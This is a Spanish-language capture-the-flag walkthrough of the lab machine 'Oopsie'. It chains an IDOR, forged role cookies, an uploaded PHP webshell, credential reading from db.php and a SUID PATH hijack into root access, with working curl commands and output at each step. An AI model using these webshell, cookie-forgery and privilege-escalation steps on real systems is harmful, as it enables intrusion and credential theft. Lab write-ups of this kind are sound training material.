// RUTA DE ATAQUE

login invitado → role=guest

cookie role=admin → uploader

bugtracker SUID + PATH hijack → root

// 01

Reconocimiento y login

1
LOCALIZAR EL PANEL
CURL
$ curl -s http://10.129.95.191/cdn-cgi/login/ | grep -oiE '<form[^>]*>|<a [^>]*href="[^"]*"'
<form method="post" action="/cdn-cgi/login/">
<a href="/?guest=true">
2
ENTRAR COMO INVITADO
CURL
$ curl -s -c -b /tmp/c.txt -L 'http://10.129.95.191/cdn-cgi/login/?guest=true'
role guest
user 2233

// NOTA

La sesión se identifica con dos cookies legibles: role y user (un «Access ID»). Que el navegador controle ambas, sin firma del lado servidor, es la primera señal de que algo se va a poder manipular.

// 02

IDOR y cookies de admin

3
IDOR: ACCESS ID DEL ADMINISTRADOR
CURL
$ curl -s -b /tmp/c.txt 'http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1'
Access ID: 34322
Name: admin
Email: admin@megacorp.com

// IDOR — INSECURE DIRECT OBJECT REFERENCE

Dónde: admin.php?content=accounts&id=N devuelve la cuenta N sin comprobar que pertenezca al usuario que pregunta.
Qué permite: enumerar cuentas y, en concreto, obtener el Access ID real del administrador (34322) simplemente cambiando un número.

4
SUPLANTAR AL ADMIN CON LAS COOKIES

Si el servidor confía en las cookies para saber quién eres, basta con poner las del administrador: role=admin; user=34322. Con eso el menú de subida de archivos (uploader) queda accesible.

// 03

Webshell y credenciales

5
SUBIR EL WEBSHELL
UPLOAD
$ CK="role=admin; user=34322"
$ curl -s -b "$CK" -F "fileToUpload=@shell.php" \
'http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads&action=upload'
$ curl -s 'http://10.129.95.191/uploads/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

// NOTA

shell.php es solo <?php echo shell_exec($_GET['c']); ?>. El uploader no filtra la extensión, así que un PHP sube y se ejecuta sin más que visitarlo en /uploads/.

6
CREDENCIALES DE ROBERT EN DB.PHP
RCE
$ curl -s -G 'http://10.129.95.191/uploads/shell.php' --data-urlencode 'c=cat /var/www/html/cdn-cgi/login/db.php'
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
SU
$ curl -s -G 'http://10.129.95.191/uploads/shell.php' --data-urlencode "c=(sleep 1; echo 'M3g4C0rpUs3r!') | script -qec 'su robert -c id' /dev/null"
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
[flag oculta] # user.txt

// 04

SUID bugtracker

7
ANALIZAR EL BINARIO
ENUM SUID
robert@oopsie:~$ ls -la /usr/bin/bugtracker
robert@oopsie:~$ strings /usr/bin/bugtracker | grep -i cat
-rwsr-xr-- 1 root bugtracker 16728 ... /usr/bin/bugtracker
cat /root/reports/

// SUID + PATH HIJACKING

Dónde: /usr/bin/bugtracker tiene el bit SUID (propietario root) y llama a cat sin ruta absoluta, confiando en el $PATH del usuario.
Qué permite: anteponer un directorio propio al PATH con un cat falso que el binario ejecutará con privilegios de root.

8
CAT FALSO Y FLAG DE ROOT
PATH HIJACK
# /tmp/cat: copia root.txt a un sitio legible por robert
chmod 755 /tmp/cat
robert@oopsie:~$ PATH=/tmp:$PATH /usr/bin/bugtracker <<< 1
robert@oopsie:~$ cat /tmp/rootflag.txt
[flag oculta]

// OJO

El binario pide el ID del reporte por entrada estándar, no por argumento: un echo 1 | bugtracker dentro de un su -c "..." se interpreta en la shell exterior y nunca llega al programa. Con un heredoc (bugtracker <<'EOF' ... EOF) sí funciona.

// FLAGS

user: [flag oculta] · root: [flag oculta]. Ruta completa: login invitado → IDOR (Access ID 34322) → cookies de admin → webshell → db.php (robert) → bugtracker SUID + PATH hijack → root. Tiempo total: ~40 minutos.

// 05

Referencia Comandos

curl -c / -b (cookie jar)
curl -c cookies.txt -b cookies.txt -L <URL>
Guarda y reutiliza las cookies de sesión entre peticiones, imprescindible para suplantar un rol.
curl -F (multipart)
curl -b "cookies" -F "campo=@archivo" <URL>
Sube un archivo como lo haría un formulario HTML real (multipart/form-data).
strings + ls -la (SUID)
ls -la binario ; strings binario | grep -i <pista>
Identifica binarios SUID y qué programas externos invocan, el primer paso para un PATH hijack.
PATH hijack
PATH=/directorio/propio:$PATH binario_suid
Antepone un directorio controlado al PATH para que un binario privilegiado ejecute un programa falso en su lugar.

// 06

Glosario

IDOR — Insecure Direct Object Reference
Vulnerabilidad donde una aplicación expone un identificador interno (un ID) y permite acceder a los datos de otro usuario con solo cambiarlo, sin comprobar permisos.
Autorización por cookie sin firmar
Patrón inseguro donde el rol o la identidad del usuario viaja en una cookie legible y modificable por el cliente, en vez de validarse contra una sesión firmada en el servidor.
Webshell
Script subido a un servidor que ejecuta comandos a petición. Aquí basta un shell_exec($_GET['c']) en PHP para tener RCE no interactiva.
SUID (Set-UID)
Permiso que hace que un ejecutable corra con los privilegios de su propietario (aquí, root) en vez de los del usuario que lo lanza. Mal usado, es una vía directa a la escalada de privilegios.
PATH hijacking
Técnica que aprovecha que un programa invoca otro comando sin ruta absoluta (cat en vez de /bin/cat): anteponiendo un directorio propio al $PATH, el sistema ejecuta la versión falsa primero.
